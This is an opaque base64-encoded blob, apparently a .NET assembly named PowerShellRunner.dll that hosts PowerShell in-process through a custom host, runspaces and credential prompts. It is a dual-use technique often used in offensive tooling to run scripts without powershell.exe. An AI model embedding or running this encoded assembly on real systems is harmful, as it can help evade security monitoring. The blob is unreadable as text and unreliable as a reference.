sQUdWNGFYUkRiMlJsQUcxbGMzTmhaMlVBU1c1MmIydGxBR2RsZEY5TFpYbEJkbUZwYkdGaWJHVUFTVVJwYzNCdmMyRmliR1VBVW1WamRHRnVaMnhsQUhKbFkzUmhibWRzWlFCblpYUmZWMmx1Wkc5M1ZHbDBiR1VBYzJWMFgxZHBibVJ2ZDFScGRHeGxBRjkzYVc1a2IzZFVhWFJzWlFCblpYUmZUbUZ0WlFCMWMyVnlUbUZ0WlFCMFlYSm5aWFJPWVcxbEFGSmxZV1JNYVc1bEFFRndjR1Z1WkV4cGJtVUFWM0pwZEdWV1pYSmliM05sVEdsdVpRQlhjbWwwWlV4cGJtVUFWM0pwZEdWWFlYSnVhVzVuVEdsdVpRQlhjbWwwWlVSbFluVm5UR2x1WlFCWGNtbDBaVVZ5Y205eVRHbHVaUUJEY21WaGRHVlFhWEJsYkdsdVpRQm5aWFJmUTNWeWNtVnVkRlZKUTNWc2RIVnlaUUJuWlhSZlEzVnljbVZ1ZEVOMWJIUjFjbVVBUkdsemNHOXpaUUJKYm1sMGFXRnNVMlZ6YzJsdmJsTjBZWFJsQUhObGRGOUJjR0Z5ZEcxbGJuUlRkR0YwWlFCWGNtbDBaUUJIZFdsa1FYUjBjbWxpZFhSbEFFUmxZblZuWjJGaWJHVkJkSFJ5YVdKMWRHVUFRMjl0Vm1semFXSnNaVUYwZEhKcFluVjBaUUJCYzNObGJXSnNlVlJwZEd4bFFYUjBjbWxpZFhSbEFFRnpjMlZ0WW14NVZISmhaR1Z0WVhKclFYUjBjbWxpZFhSbEFFRnpjMlZ0WW14NVJtbHNaVlpsY25OcGIyNUJkSFJ5YVdKMWRHVUFRWE56WlcxaWJIbERiMjVtYVdkMWNtRjBhVzl1UVhSMGNtbGlkWFJsQUVGemMyVnRZbXg1UkdWelkzSnBjSFJwYjI1QmRIUnlhV0oxZEdVQVEyOXRjR2xzWVhScGIyNVNaV3hoZUdGMGFXOXVjMEYwZEhKcFluVjBaUUJCYzNObGJXSnNlVkJ5YjJSMVkzUkJkSFJ5YVdKMWRHVUFRWE56WlcxaWJIbERiM0I1Y21sbmFIUkJkSFJ5YVdKMWRHVUFRWE56WlcxaWJIbERiMjF3WVc1NVFYUjBjbWxpZFhSbEFGSjFiblJwYldWRGIyMXdZWFJwWW1sc2FYUjVRWFIwY21saWRYUmxBSFpoYkhWbEFHZGxkRjlDZFdabVpYSlRhWHBsQUhObGRGOUNkV1ptWlhKVGFYcGxBRjlpZFdabVpYSlRhWHBsQUdkbGRGOURkWEp6YjNKVGFYcGxBSE5sZEY5RGRYSnpiM0pUYVhwbEFGOWpkWEp6YjNKVGFYcGxBR2RsZEY5WGFXNWtiM2RUYVhwbEFITmxkRjlYYVc1a2IzZFRhWHBsQUdkbGRGOU5ZWGhRYUhsemFXTmhiRmRwYm1SdmQxTnBlbVVBWDIxaGVGQm9lWE5wWTJGc1YybHVaRzkzVTJsNlpRQm5aWFJmVFdGNFYybHVaRzkzVTJsNlpRQmZiV0Y0VjJsdVpHOTNVMmw2WlFCZmQybHVaRzkzVTJsNlpRQlRlWE4wWlcwdVZHaHlaV0ZrYVc1bkFGSmxZV1JNYVc1bFFYTlRaV04xY21WVGRISnBibWNBVkc5VGRISnBibWNBYzJWMFgxZHBaSFJvQUY5eVlYZFZhUUJmZFdrQVVGTkRjbVZrWlc1MGFXRnNBRkJ5YjIxd2RFWnZja055WldSbGJuUnBZV3dBVTNsemRHVnRMa052Ykd4bFkzUnBiMjV6TGs5aWFtVmpkRTF2WkdWc0FGQnZkMlZ5VTJobGJHeFNkVzV1WlhJdVpHeHNBRUoxWm1abGNrTmxiR3dBWm1sc2JBQm5aWFJmU1hSbGJRQlRlWE4wWlcwQVQzQmxiZ0J2Y21sbmFXNEFaMlYwWDFabGNuTnBiMjRBVG05MGFXWjVSVzVrUVhCd2JHbGpZWFJwYjI0QVRtOTBhV1o1UW1WbmFXNUJjSEJzYVdOaGRHbHZiZ0JUZVhOMFpXMHVUV0Z1WVdkbGJXVnVkQzVCZFhSdmJXRjBhVzl1QUdSbGMzUnBibUYwYVc5dUFGTjVjM1JsYlM1SGJHOWlZV3hwZW1GMGFXOXVBRk41YzNSbGJTNVNaV1pzWldOMGFXOXVBRU52YlcxaGJtUkRiMnhzWldOMGFXOXVBR2RsZEY5RGRYSnpiM0pRYjNOcGRHbHZiZ0J6WlhSZlEzVnljMjl5VUc5emFYUnBiMjRBWDJOMWNuTnZjbEJ2YzJsMGFXOXVBR2RsZEY5WGFXNWtiM2RRYjNOcGRHbHZiZ0J6WlhSZlYybHVaRzkzVUc5emFYUnBiMjRBWDNkcGJtUnZkMUJ2YzJsMGFXOXVBR05oY0hScGIyNEFUbTkwU1cxd2JHVnRaVzUwWldSRmVHTmxjSFJwYjI0QVJtbGxiR1JFWlhOamNtbHdkR2x2YmdCRGFHOXBZMlZFWlhOamNtbHdkR2x2YmdCRGRXeDBkWEpsU1c1bWJ3QkxaWGxKYm1adkFHTnNhWEFBVTNSeWFXNW5RblZwYkdSbGNnQkdiSFZ6YUVsdWNIVjBRblZtWm1WeUFITmxkRjlCZFhSb2IzSnBlbUYwYVc5dVRXRnVZV2RsY2dCUWIzZGxjbE5vWld4c1VuVnVibVZ5QUdkbGRGOUdiM0psWjNKdmRXNWtRMjlzYjNJQWMyVjBYMFp2Y21WbmNtOTFibVJEYjJ4dmNnQmZabTl5WldkeWIzVnVaRU52Ykc5eUFHZGxkRjlDWVdOclozSnZkVzVrUTI5c2IzSUFjMlYwWDBKaFkydG5jbTkxYm1SRGIyeHZjZ0JmWW1GamEyZHliM1Z1WkVOdmJHOXlBRU52Ym5OdmJHVkRiMnh2Y2dBdVkzUnZjZ0JUZVhOMFpXMHVSR2xoWjI1dmMzUnBZM01BWjJWMFgwTnZiVzFoYm1SekFGTjVjM1JsYlM1TllXNWhaMlZ0Wlc1MExrRjFkRzl0WVhScGIyNHVVblZ1YzNCaFkyVnpBR05vYjJsalpYTUFVM2x6ZEdWdExsSjFiblJwYldVdVNXNTBaWEp2Y0ZObGNuWnBZMlZ6QUZONWMzUmxiUzVTZFc1MGFXMWxMa052YlhCcGJHVnlVMlZ5ZG1salpYTUFSR1ZpZFdkbmFXNW5UVzlrWlhNQVVGTkRjbVZrWlc1MGFXRnNWSGx3WlhNQVlXeHNiM2RsWkVOeVpXUmxiblJwWVd4VWVYQmxjd0JRYVhCbGJHbHVaVkpsYzNWc2RGUjVjR1Z6QUVOdmIzSmthVzVoZEdWekFGQlRRM0psWkdWdWRHbGhiRlZKVDNCMGFXOXVjd0JTWldGa1MyVjVUM0IwYVc5dWN3QmtaWE5qY21sd2RHbHZibk1BYjNCMGFXOXVjd0JYY21sMFpWQnliMmR5WlhOekFFMWxjbWRsVFhsU1pYTjFiSFJ6QUZOamNtOXNiRUoxWm1abGNrTnZiblJsYm5SekFFZGxkRUoxWm1abGNrTnZiblJsYm5SekFGTmxkRUoxWm1abGNrTnZiblJsYm5SekFHTnZiblJsYm5SekFFTnZibU5oZEFCUVUwOWlhbVZqZEFCelpYUmZTR1ZwWjJoMEFGTmxkRk5vYjNWc1pFVjRhWFFBUTNKbFlYUmxSR1ZtWVhWc2RBQkJaR1JUWTNKcGNIUUFSVzUwWlhKT1pYTjBaV1JRY205dGNIUUFSWGhwZEU1bGMzUmxaRkJ5YjIxd2RBQlRlWE4wWlcwdVRXRnVZV2RsYldWdWRDNUJkWFJ2YldGMGFXOXVMa2h2YzNRQVEzVnpkRzl0VUZOSWIzTjBBR2RsZEY5UGRYUndkWFFBVTNsemRHVnRMbFJsZUhRQVVtVmhaRXRsZVFCU2RXNXpjR0ZqWlVaaFkzUnZjbmtBVTNsemRHVnRMbE5sWTNWeWFYUjVBQUFBRjI4QWRRQjBBQzBBWkFCbEFHWUFZUUIxQUd3QWRBQUJGME1BYndCdUFITUFid0JzQUdVQVNBQnZBSE1BZEFBQWdYZEZBRzRBZEFCbEFISUFUZ0JsQUhNQWRBQmxBR1FBVUFCeUFHOEFiUUJ3QUhRQUlBQnBBSE1BSUFCdUFHOEFkQUFnQUdrQWJRQndBR3dBWlFCdEFHVUFiZ0IwQUdVQVpBQXVBQ0FBSUFCVUFHZ0FaUUFnQUhNQVl3QnlBR2tBY0FCMEFDQUFhUUJ6QUNBQVlRQnpBR3NBYVFCdUFHY0FJQUJtQUc4QWNnQWdBR2tBYmdCd0FIVUFkQUFzQUNBQWR3Qm9BR2tBWXdCb0FDQUFhUUJ6QUNBQVlRQWdBSEFBY2dCdkFHSUFiQUJsQUcwQUlBQnpBR2tBYmdCakFHVUFJQUIwQUdnQVpRQnlBR1VBSndCekFDQUFiZ0J2QUNBQVl3QnZBRzRBY3dCdkFHd0FaUUF1QUNBQUlBQk5BR0VBYXdCbEFDQUFjd0IxQUhJQVpRQWdBSFFBYUFCbEFDQUFjd0JqQUhJQWFRQndBSFFBSUFCakFHRUFiZ0FnQUdVQWVBQmxBR01BZFFCMEFHVUFJQUIzQUdrQWRBQm9BRzhBZFFCMEFDQUFjQUJ5QUc4QWJRQndBSFFBYVFCdUFHY0FJQUIwQUdnQVpRQWdBSFVBY3dCbEFISUFJQUJtQUc4QWNnQWdBR2tBYmdCd0FIVUFkQUF1QUFHQmRVVUFlQUJwQUhRQVRnQmxBSE1BZEFCbEFHUUFVQUJ5QUc4QWJRQndBSFFBSUFCcEFITUFJQUJ1QUc4QWRBQWdBR2tBYlFCd0FHd0FaUUJ0QUdVQWJnQjBBR1VBWkFBdUFDQUFJQUJVQUdnQVpRQWdBSE1BWXdCeUFHa0FjQUIwQUNBQWFRQnpBQ0FBWVFCekFHc0FhUUJ1QUdjQUlBQm1BRzhBY2dBZ0FHa0FiZ0J3QUhVQWRBQXNBQ0FBZHdCb0FHa0FZd0JvQUNBQWFRQnpBQ0FBWVFBZ0FIQUFjZ0J2QUdJQWJBQmxBRzBBSUFCekFHa0FiZ0JqQUdVQUlBQjBBR2dBWlFCeUFHVUFKd0J6QUNBQWJnQnZBQ0FBWXdCdkFHNEFjd0J2QUd3QVpRQXVBQ0FBSUFCTkFHRUFhd0JsQUNBQWN3QjFBSElBWlFBZ0FIUUFhQUJsQUNBQWN3QmpBSElBYVFCd0FIUUFJQUJqQUdFQWJnQWdBR1VBZUFCbEFHTUFkUUIwQUdVQUlBQjNBR2tBZEFCb0FHOEFkUUIwQUNBQWNBQnlBRzhBYlFCd0FIUUFhUUJ1QUdjQUlBQjBBR2dBWlFBZ0FIVUFjd0JsQUhJQUlBQm1BRzhBY2dBZ0FHa0FiZ0J3QUhVQWRBQXVBQUVEQ2dBQUQwUUFSUUJDQUZVQVJ3QTZBQ0FBQUE5RkFGSUFVZ0JQQUZJQU9nQWdBQUFUVmdCRkFGSUFRZ0JQQUZNQVJRQTZBQ0FBQUJOWEFFRUFVZ0JPQUVrQVRnQkhBRG9BSUFBQWdXRlFBSElBYndCdEFIQUFkQUFnQUdrQWN3QWdBRzRBYndCMEFDQUFhUUJ0QUhBQWJBQmxBRzBBWlFCdUFIUUFaUUJrQUM0QUlBQWdBRlFBYUFCbEFDQUFjd0JqQUhJQWFRQndBSFFBSUFCcEFITUFJQUJoQUhNQWF3QnBBRzRBWndBZ0FHWUFid0J5QUNBQWFRQnVBSEFBZFFCMEFDd0FJQUIzQUdnQWFRQmpBR2dBSUFCcEFITUFJQUJoQUNBQWNBQnlBRzhBWWdCc0FHVUFiUUFnQUhNQWFRQnVBR01BWlFBZ0FIUUFhQUJsQUhJQVpRQW5BSE1BSUFCdUFHOEFJQUJqQUc4QWJnQnpBRzhBYkFCbEFDNEFJQUFnQUUwQVlRQnJBR1VBSUFCekFIVUFjZ0JsQUNBQWRBQm9BR1VBSUFCekFHTUFjZ0JwQUhBQWRBQWdBR01BWVFCdUFDQUFaUUI0QUdVQVl3QjFBSFFBWlFBZ0FIY0FhUUIwQUdnQWJ3QjFBSFFBSUFCd0FISUFid0J0QUhBQWRBQnBBRzRBWndBZ0FIUUFhQUJsQUNBQWRRQnpBR1VBY2dBZ0FHWUFid0J5QUNBQWFRQnVBSEFBZFFCMEFDNEFBWUZ6VUFCeUFHOEFiUUJ3QUhRQVJnQnZBSElBUXdCb0FHOEFhUUJqQUdVQUlBQnBBSE1BSUFCdUFHOEFkQUFnQUdrQWJRQndBR3dBWlFCdEFHVUFiZ0IwQUdVQVpBQXVBQ0FBSUFCVUFHZ0FaUUFnQUhNQVl3QnlBR2tBY0FCMEFDQUFhUUJ6QUNBQVlRQnpBR3NBYVFCdUFHY0FJQUJtQUc4QWNnQWdBR2tBYmdCd0FIVUFkQUFzQUNBQWR3Qm9BR2tBWXdCb0FDQUFhUUJ6QUNBQVlRQWdBSEFBY2dCdkFHSUFiQUJsQUcwQUlBQnpBR2tBYmdCakFHVUFJQUIwQUdnQVpRQnlBR1VBSndCekFDQUFiZ0J2QUNBQVl3QnZBRzRBY3dCdkFHd0FaUUF1QUNBQUlBQk5BR0VBYXdCbEFDQUFjd0IxQUhJQVpRQWdBSFFBYUFCbEFDQUFjd0JqQUhJQWFRQndBSFFBSUFCakFHRUFiZ0FnQUdVQWVBQmxBR01BZFFCMEFHVUFJQUIzQUdrQWRBQm9BRzhBZFFCMEFDQUFjQUJ5QUc4QWJRQndBSFFBYVFCdUFHY0FJQUIwQUdnQVpRQWdBSFVBY3dCbEFISUFJQUJtQUc4QWNnQWdBR2tBYmdCd0FIVUFkQUF1QUFHQmZWQUFjZ0J2QUcwQWNBQjBBRVlBYndCeUFFTUFjZ0JsQUdRQVpRQnVBSFFBYVFCaEFHd0FNUUFnQUdrQWN3QWdBRzRBYndCMEFDQUFhUUJ0QUhBQWJBQmxBRzBBWlFCdUFIUUFaUUJrQUM0QUlBQWdBRlFBYUFCbEFDQUFjd0JqQUhJQWFRQndBSFFBSUFCcEFITUFJQUJoQUhNQWF3QnBBRzRBWndBZ0FHWUFid0J5QUNBQWFRQnVBSEFBZFFCMEFDd0FJQUIzQUdnQWFRQmpBR2dBSUFCcEFITUFJQUJoQUNBQWNBQnlBRzhBWWdCc0FHVUFiUUFnQUhNQWFRQnVBR01BWlFBZ0FIUUFhQUJsQUhJQVpRQW5BSE1BSUFCdUFHOEFJQUJqQUc4QWJnQnpBRzhBYkFCbEFDNEFJQUFnQUUwQVlRQnJBR1VBSUFCekFIVUFjZ0JsQUNBQWRBQm9BR1VBSUFCekFHTUFjZ0JwQUhBQWRBQWdBR01BWVFCdUFDQUFaUUI0QUdVQVl3QjFBSFFBWlFBZ0FIY0FhUUIwQUdnQWJ3QjFBSFFBSUFCd0FISUFid0J0QUhBQWRBQnBBRzRBWndBZ0FIUUFhQUJsQUNBQWRRQnpBR1VBY2dBZ0FHWUFid0J5QUNBQWFRQnVBSEFBZFFCMEFDNEFBWUY5VUFCeUFHOEFiUUJ3QUhRQVJnQnZBSElBUXdCeUFHVUFaQUJsQUc0QWRBQnBBR0VBYkFBeUFDQUFhUUJ6QUNBQWJnQnZBSFFBSUFCcEFHMEFjQUJzQUdVQWJRQmxBRzRBZEFCbEFHUUFMZ0FnQUNBQVZBQm9BR1VBSUFCekFHTUFjZ0JwQUhBQWRBQWdBR2tBY3dBZ0FHRUFjd0JyQUdrQWJnQm5BQ0FBWmdCdkFISUFJQUJwQUc0QWNBQjFBSFFBTEFBZ0FIY0FhQUJwQUdNQWFBQWdBR2tBY3dBZ0FHRUFJQUJ3QUhJQWJ3QmlBR3dBWlFCdEFDQUFjd0JwQUc0QVl3QmxBQ0FBZEFCb0FHVUFjZ0JsQUNjQWN3QWdBRzRBYndBZ0FHTUFid0J1QUhNQWJ3QnNBR1VBTGdBZ0FDQUFUUUJoQUdzQVpRQWdBSE1BZFFCeUFHVUFJQUIwQUdnQVpRQWdBSE1BWXdCeUFHa0FjQUIwQUNBQVl3QmhBRzRBSUFCbEFIZ0FaUUJqQUhVQWRBQmxBQ0FBZHdCcEFIUUFhQUJ2QUhVQWRBQWdBSEFBY2dCdkFHMEFjQUIwQUdrQWJnQm5BQ0FBZEFCb0FHVUFJQUIxQUhNQVpRQnlBQ0FBWmdCdkFISUFJQUJwQUc0QWNBQjFBSFFBTGdBQmdXVlNBR1VBWVFCa0FFd0FhUUJ1QUdVQUlBQnBBSE1BSUFCdUFHOEFkQUFnQUdrQWJRQndBR3dBWlFCdEFHVUFiZ0IwQUdVQVpBQXVBQ0FBSUFCVUFHZ0FaUUFnQUhNQVl3QnlBR2tBY0FCMEFDQUFhUUJ6QUNBQVlRQnpBR3NBYVFCdUFHY0FJQUJtQUc4QWNnQWdBR2tBYmdCd0FIVUFkQUFzQUNBQWR3Qm9BR2tBWXdCb0FDQUFhUUJ6QUNBQVlRQWdBSEFBY2dCdkFHSUFiQUJsQUcwQUlBQnpBR2tBYmdCakFHVUFJQUIwQUdnQVpRQnlBR1VBSndCekFDQUFiZ0J2QUNBQVl3QnZBRzRBY3dCdkFHd0FaUUF1QUNBQUlBQk5BR0VBYXdCbEFDQUFjd0IxQUhJQVpRQWdBSFFBYUFCbEFDQUFjd0JqQUhJQWFRQndBSFFBSUFCakFHRUFiZ0FnQUdVQWVBQmxBR01BZFFCMEFHVUFJQUIzQUdrQWRBQm9BRzhBZFFCMEFDQUFjQUJ5QUc4QWJRQndBSFFBYVFCdUFHY0FJQUIwQUdnQVpRQWdBSFVBY3dCbEFISUFJQUJtQUc4QWNnQWdBR2tBYmdCd0FIVUFkQUF1QUFHQmdWSUFaUUJoQUdRQVRBQnBBRzRBWlFCQkFITUFVd0JsQUdNQWRRQnlBR1VBVXdCMEFISUFhUUJ1QUdjQUlBQnBBSE1BSUFCdUFHOEFkQUFnQUdrQWJRQndBR3dBWlFCdEFHVUFiZ0IwQUdVQVpBQXVBQ0FBSUFCVUFHZ0FaUUFnQUhNQVl3QnlBR2tBY0FCMEFDQUFhUUJ6QUNBQVlRQnpBR3NBYVFCdUFHY0FJQUJtQUc4QWNnQWdBR2tBYmdCd0FIVUFkQUFzQUNBQWR3Qm9BR2tBWXdCb0FDQUFhUUJ6QUNBQVlRQWdBSEFBY2dCdkFHSUFiQUJsQUcwQUlBQnpBR2tBYmdCakFHVUFJQUIwQUdnQVpRQnlBR1VBSndCekFDQUFiZ0J2QUNBQVl3QnZBRzRBY3dCdkFHd0FaUUF1QUNBQUlBQk5BR0VBYXdCbEFDQUFjd0IxQUhJQVpRQWdBSFFBYUFCbEFDQUFjd0JqQUhJQWFRQndBSFFBSUFCakFHRUFiZ0FnQUdVQWVBQmxBR01BZFFCMEFHVUFJQUIzQUdrQWRBQm9BRzhBZFFCMEFDQUFjQUJ5QUc4QWJRQndBSFFBYVFCdUFHY0FJQUIwQUdnQVpRQWdBSFVBY3dCbEFISUFJQUJtQUc4QWNnQWdBR2tBYmdCd0FIVUFkQUF1QUFGSlJnQnNBSFVBY3dCb0FFa0FiZ0J3QUhVQWRBQkNBSFVBWmdCbUFHVUFjZ0FnQUdrQWN3QWdBRzRBYndCMEFDQUFhUUJ0QUhBQWJBQmxBRzBBWlFCdUFIUUFaUUJrQUM0QUFFdEhBR1VBZEFCQ0FIVUFaZ0JtQUdVQWNnQkRBRzhBYmdCMEFHVUFiZ0IwQUhNQUlBQnBBSE1BSUFCdUFHOEFkQUFnQUdrQWJRQndBR3dBWlFCdEFHVUFiZ0IwQUdVQVpBQXVBQUJCU3dCbEFIa0FRUUIyQUdFQWFRQnNBR0VBWWdCc0FHVUFJQUJwQUhNQUlBQnVBRzhBZEFBZ0FHa0FiUUJ3QUd3QVpRQnRBR1VBYmdCMEFHVUFaQUF1QUFDQlkxSUFaUUJoQUdRQVN3QmxBSGtBSUFCcEFITUFJQUJ1QUc4QWRBQWdBR2tBYlFCd0FHd0FaUUJ0QUdVQWJnQjBBR1VBWkFBdUFDQUFJQUJVQUdnQVpRQWdBSE1BWXdCeUFHa0FjQUIwQUNBQWFRQnpBQ0FBWVFCekFHc0FhUUJ1QUdjQUlBQm1BRzhBY2dBZ0FHa0FiZ0J3QUhVQWRBQXNBQ0FBZHdCb0FHa0FZd0JvQUNBQWFRQnpBQ0FBWVFBZ0FIQUFjZ0J2QUdJQWJBQmxBRzBBSUFCekFHa0FiZ0JqQUdVQUlBQjBBR2dBWlFCeUFHVUFKd0J6QUNBQWJnQnZBQ0FBWXdCdkFHNEFjd0J2QUd3QVpRQXVBQ0FBSUFCTkFHRUFhd0JsQUNBQWN3QjFBSElBWlFBZ0FIUUFhQUJsQUNBQWN3QmpBSElBYVFCd0FIUUFJQUJqQUdFQWJnQWdBR1VBZUFCbEFHTUFkUUIwQUdVQUlBQjNBR2tBZEFCb0FHOEFkUUIwQUNBQWNBQnlBRzhBYlFCd0FIUUFhUUJ1QUdjQUlBQjBBR2dBWlFBZ0FIVUFjd0JsQUhJQUlBQm1BRzhBY2dBZ0FHa0FiZ0J3QUhVQWRBQXVBQUZQVXdCakFISUFid0JzQUd3QVFnQjFBR1lBWmdCbEFISUFRd0J2QUc0QWRBQmxBRzRBZEFCekFDQUFhUUJ6QUNBQWJnQnZBSFFBSUFCcEFHMEFjQUJzQUdVQWJRQmxBRzRBZEFCbEFHUUFBRXRUQUdVQWRBQkNBSFVBWmdCbUFHVUFjZ0JEQUc4QWJnQjBBR1VBYmdCMEFITUFJQUJwQUhNQUlBQnVBRzhBZEFBZ0FHa0FiUUJ3QUd3QVpRQnRBR1VBYmdCMEFHVUFaQUF1QUFCSlV3QmxBSFFBUWdCMUFHWUFaZ0JsQUhJQVF3QnZBRzRBZEFCbEFHNEFkQUJ6QUNBQWFRQnpBQ0FBYmdCdkFIUUFJQUJwQUcwQWNBQnNBR1VBYlFCbEFHNEFkQUJsQUdRQUFBRUFBQURNT2pMNHNmcC9SS29oYWZUdTUxMCtBQVFnQVFFSUF5QUFBUVVnQVFFUkVRUWdBUUVPQkNBQkFRSUtCd1FTREJKQkVrVVNTUVFBQUJKQkJpQUJBUkdBclFZZ0FRRVNnTEVJQUFJU1JSSk5Fa0VFSUFBU1NRVWdBQktBdVFjVkVuVUJFb0M5QlNBQkV3QUlDU0FDQVJHQXdSR0F3UWdnQUJVU2RRRVNjUVFnQUJKWkJTQUNBUWdJQlFBQUVvREpCQ0FBRWwwRUFBQVJVUVVnQVJKaERnVUFBZzRPRGdNZ0FBNElCd0lSZ0pVUmdKa0l0M3BjVmhrMDRJa0lNYjg0VnEwMlRqVURCaEZSQXdZU0VBTUdFbUVEQmhJVUJBWVJnSlVFQmhHQW1RSUdDQU1HRVdVQ0JnNEVBQUVPRGdRZ0FCRlJCQ0FBRWxVSUlBTUJFV1VSWlE0R0lBSUJDaEpwRVNBREZSSnRBZzRTY1E0T0ZSSjFBUko1RENBRUNBNE9GUkoxQVJKOUNBOGdCaEtBZ1E0T0RnNFJnSVVSZ0lrSklBUVNnSUVPRGc0T0JTQUFFb0NOQlNBQUVvQ1JCQ0FBRVdVRklBRUJFV1VGSUFBUmdKVUdJQUVCRVlDVkJTQUFFWUNaQmlBQkFSR0FtUU1nQUFnT0lBRVVFWUNkQWdBQ0FBQVJnS0VESUFBQ0NDQUJFWUNsRVlDcER5QUVBUkdBb1JHQW1SR0FvUkdBblFrZ0FnRVJnS0VSZ0owUElBSUJFWUNaRkJHQW5RSUFBZ0FBQkNnQUVWRURLQUFPQkNnQUVsVUVLQUFTV1FRb0FCSmRCU2dBRW9DTkJDZ0FFV1VGS0FBUmdKVUZLQUFSZ0prREtBQUlBeWdBQWdnQkFBZ0FBQUFBQUI0QkFBRUFWQUlXVjNKaGNFNXZia1Y0WTJWd2RHbHZibFJvY205M2N3RUlBUUFDQUFBQUFBQVZBUUFRVUc5M1pYSlRhR1ZzYkZKMWJtNWxjZ0FBQlFFQUFBQUFGd0VBRWtOdmNIbHlhV2RvZENEQ3FTQWdNakF4TkFBQUtRRUFKR1JtWXpSbFpXSmlMVGN6T0RRdE5HUmlOUzA1WW1Ga0xUSTFOekl3TXpBeU9XSmtPUUFBREFFQUJ6RXVNQzR3TGpBQUFBQUFBS3hLQUFBQUFBQUFBQUFBQU1aS0FBQUFJQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFDNFNnQUFBQUFBQUFBQUFBQUFBRjlEYjNKRWJHeE5ZV2x1QUcxelkyOXlaV1V1Wkd4c0FBQUFBQUQvSlFBZ0FCQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUJBQkFBQUFBWUFBQ0FBQUFBQUFBQUFBQUFBQUFBQUFBQkFBRUFBQUF3QUFDQUFBQUFBQUFBQUFBQUFBQUFBQUFCQUFBQUFBQklBQUFBV0dBQUFGd0RBQUFBQUFBQUFBQUFBRndETkFBQUFGWUFVd0JmQUZZQVJRQlNBRk1BU1FCUEFFNEFYd0JKQUU0QVJnQlBBQUFBQUFDOUJPLytBQUFCQUFBQUFRQUFBQUFBQUFBQkFBQUFBQUEvQUFBQUFBQUFBQVFBQUFBQ0FBQUFBQUFBQUFBQUFBQUFBQUFBUkFBQUFBRUFWZ0JoQUhJQVJnQnBBR3dBWlFCSkFHNEFaZ0J2QUFBQUFBQWtBQVFBQUFCVUFISUFZUUJ1QUhNQWJBQmhBSFFBYVFCdkFHNEFBQUFBQUFBQXNBUzhBZ0FBQVFCVEFIUUFjZ0JwQUc0QVp3QkdBR2tBYkFCbEFFa0FiZ0JtQUc4QUFBQ1lBZ0FBQVFBd0FEQUFNQUF3QURBQU5BQmlBREFBQUFBYUFBRUFBUUJEQUc4QWJRQnRBR1VBYmdCMEFITUFBQUFBQUFBQUlnQUJBQUVBUXdCdkFHMEFjQUJoQUc0QWVRQk9BR0VBYlFCbEFBQUFBQUFBQUFBQVNnQVJBQUVBUmdCcEFHd0FaUUJFQUdVQWN3QmpBSElBYVFCd0FIUUFhUUJ2QUc0QUFBQUFBRkFBYndCM0FHVUFjZ0JUQUdnQVpRQnNBR3dBVWdCMUFHNEFiZ0JsQUhJQUFBQUFBREFBQ0FBQkFFWUFhUUJzQUdVQVZnQmxBSElBY3dCcEFHOEFiZ0FBQUFBQU1RQXVBREFBTGdBd0FDNEFNQUFBQUVvQUZRQUJBRWtBYmdCMEFHVUFjZ0J1QUdFQWJBQk9BR0VBYlFCbEFBQUFVQUJ2QUhjQVpRQnlBRk1BYUFCbEFHd0FiQUJTQUhVQWJnQnVBR1VBY2dBdUFHUUFiQUJzQUFBQUFBQklBQklBQVFCTUFHVUFad0JoQUd3QVF3QnZBSEFBZVFCeUFHa0Fad0JvQUhRQUFBQkRBRzhBY0FCNUFISUFhUUJuQUdnQWRBQWdBS2tBSUFBZ0FESUFNQUF4QURRQUFBQXFBQUVBQVFCTUFHVUFad0JoQUd3QVZBQnlBR0VBWkFCbEFHMEFZUUJ5QUdzQWN3QUFBQUFBQUFBQUFGSUFGUUFCQUU4QWNnQnBBR2NBYVFCdUFHRUFiQUJHQUdrQWJBQmxBRzRBWVFCdEFHVUFBQUJRQUc4QWR3QmxBSElBVXdCb0FHVUFiQUJzQUZJQWRRQnVBRzRBWlFCeUFDNEFaQUJzQUd3QUFBQUFBRUlBRVFBQkFGQUFjZ0J2QUdRQWRRQmpBSFFBVGdCaEFHMEFaUUFBQUFBQVVBQnZBSGNBWlFCeUFGTUFhQUJsQUd3QWJBQlNBSFVBYmdCdUFHVUFjZ0FBQUFBQU5BQUlBQUVBVUFCeUFHOEFaQUIxQUdNQWRBQldBR1VBY2dCekFHa0Fid0J1QUFBQU1RQXVBREFBTGdBd0FDNEFNQUFBQURnQUNBQUJBRUVBY3dCekFHVUFiUUJpQUd3QWVRQWdBRllBWlFCeUFITUFhUUJ2QUc0QUFBQXhBQzRBTUFBdUFEQUFMZ0F3QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFBTUFBQUEydUR1FjQUFBQVlFZ0lBQUFBQUFBQUFBQUFQQUFBQVVCSUNBRUFBQUFBQUFBQUFBUUFBQUNJRmt4a0dBQUFBVUJFQ0FBQUFBQUFBQUFBQURRQUFBSUFSQWdCSUFBQUFBQUFBQUFFQUFBQUFBQUFBdThMaVZ3QUFBQUFOQUFBQWlBTUFBUFFNQWdEMDhnRUFBQUFBQUx2QzRsY0FBQUFBRGdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFsQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQ